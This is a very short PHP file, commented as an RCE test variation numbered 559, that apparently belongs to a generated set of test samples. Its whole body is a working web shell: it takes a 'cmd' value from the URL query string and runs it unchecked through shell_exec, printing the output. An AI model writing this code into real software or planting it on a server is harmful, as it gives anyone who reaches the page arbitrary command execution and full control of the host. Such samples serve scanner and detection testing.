<?php
// RCE test variation #559
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>